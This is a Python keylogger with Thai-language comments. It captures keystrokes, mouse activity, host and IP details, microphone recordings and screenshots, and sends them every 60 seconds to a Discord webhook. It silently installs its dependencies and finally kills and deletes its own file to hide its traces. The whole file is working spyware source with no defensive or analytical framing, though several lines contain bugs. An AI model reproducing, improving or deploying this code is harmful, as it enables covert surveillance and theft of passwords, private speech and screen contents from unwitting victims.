try:
    import logging
    import os
    import platform
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    import requests
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot", "sounddevice", "pynput", "requests"]
    call("pip install " + ' '.join(modules), shell=True)

finally:
    DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"  # Webhook URL ของ Discord
    SEND_REPORT_EVERY = 60  # ส่งรายงานทุก 60 วินาที

    class KeyLogger:
        def __init__(self, time_interval):
            self.interval = time_interval
            self.log = "KeyLogger เริ่มทำงาน..."

        def appendlog(self, string):
            self.log = self.log + string

        def on_move(self, x, y):
            current_move = logging.info("เมาส์เคลื่อนที่ไปที่ตำแหน่ง {} {}".format(x, y))
            self.appendlog(current_move)

        def on_click(self, x, y):
            current_click = logging.info("คลิกเมาส์ที่ตำแหน่ง {} {}".format(x, y))
            self.appendlog(current_click)

        def on_scroll(self, x, y):
            current_scroll = logging.info("เลื่อนเมาส์ที่ตำแหน่ง {} {}".format(x, y))
            self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key)

        def send_to_discord(self, message, file=None):
            data = {
                "content": message
            }
            if file:
                with open(file, "rb") as f:
                    files = {
                        "file": f
                    }
                    response = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files)
            else:
                response = requests.post(DISCORD_WEBHOOK_URL, data=data)

            if response.status_code == 204:
                print("ส่งข้อมูลไปยัง Discord สำเร็จ")
            else:
                print(f"เกิดข้อผิดพลาดในการส่งข้อมูล: {response.status_code}")

        def report(self):
            self.send_to_discord("Keylogger รายงานการทำงาน:\n\n" + self.log)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(f"Hostname: {hostname}")
            self.appendlog(f"IP: {ip}")
            self.appendlog(f"Platform: {plat}")
            self.appendlog(f"System: {system}")
            self.appendlog(f"Machine: {machine}")

        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            obj.writeframesraw(myrecording)
            sd.wait()

            self.send_to_discord("บันทึกเสียง:", "sound.wav")

        def screenshot(self):
            img = pyscreenshot.grab()
            img.save("screenshot.png")
            self.send_to_discord("บันทึกภาพหน้าจอ:", "screenshot.png")

        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()

            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('ไฟล์ถูกปิดแล้ว.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('ไฟล์ถูกปิดแล้ว.')

            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " + os.path.basename(__file__))
                    print('ไฟล์ถูกปิดแล้ว.')
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print('ไฟล์ถูกปิดแล้ว.')

    keylogger = KeyLogger(SEND_REPORT_EVERY)
    keylogger.run()